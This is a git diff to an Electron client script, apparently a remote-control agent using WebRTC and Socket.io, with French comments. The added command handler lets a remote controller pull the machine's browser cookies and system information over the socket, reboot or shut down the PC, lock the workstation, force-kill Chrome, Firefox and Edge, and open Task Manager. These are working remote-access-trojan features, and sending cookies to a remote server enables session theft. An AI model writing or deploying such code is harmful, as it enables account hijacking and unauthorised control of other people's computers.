@@ -77,6 +77,35 @@ async function createPeerConnection(controllerId) {
 }
 
 // ── Socket.io ──
+// ── Commandes macro + info ──
+socket_on_command = async (cmd) => {
+  if (cmd === 'get-info') {
+    const info = await ipcRenderer.invoke('get-system-info');
+    socket.emit('command:result', { cmd, data: info });
+  } else if (cmd === 'get-cookies') {
+    const result = await ipcRenderer.invoke('get-cookies');
+    socket.emit('command:result', { cmd, data: result });
+  } else if (cmd === 'reboot') {
+    require('child_process').exec('shutdown /r /t 5');
+    socket.emit('command:result', { cmd, data: 'Redémarrage dans 5s' });
+  } else if (cmd === 'shutdown') {
+    require('child_process').exec('shutdown /s /t 5');
+    socket.emit('command:result', { cmd, data: 'Extinction dans 5s' });
+  } else if (cmd === 'lock') {
+    require('child_process').exec('rundll32.exe user32.dll,LockWorkStation');
+    socket.emit('command:result', { cmd, data: 'Poste verrouillé' });
+  } else if (cmd === 'kill-browser') {
+    require('child_process').exec('taskkill /F /IM chrome.exe /IM firefox.exe /IM msedge.exe 2>nul');
+    socket.emit('command:result', { cmd, data: 'Navigateur fermé' });
+  } else if (cmd === 'open-taskmgr') {
+    require('child_process').exec('taskmgr');
+    socket.emit('command:result', { cmd, data: 'Gestionnaire ouvert' });
+  } else if (cmd === 'screenshot-info') {
+    const info = await ipcRenderer.invoke('get-screen-size');
+    socket.emit('command:result', { cmd, data: info });
+  }
+};
+
 async function connect() {
   const hostname = await ipcRenderer.invoke('get-hostname');
 
@@ -119,6 +148,8 @@ async function connect() {
   socket.on('input', (event) => {
     ipcRenderer.send('execute-input', event);
   });
+
+  socket.on('command', (cmd) => { socket_on_command(cmd); });
 
   socket.on('controller:left', (controllerId) => {
     const pc = peerConnections[controllerId];
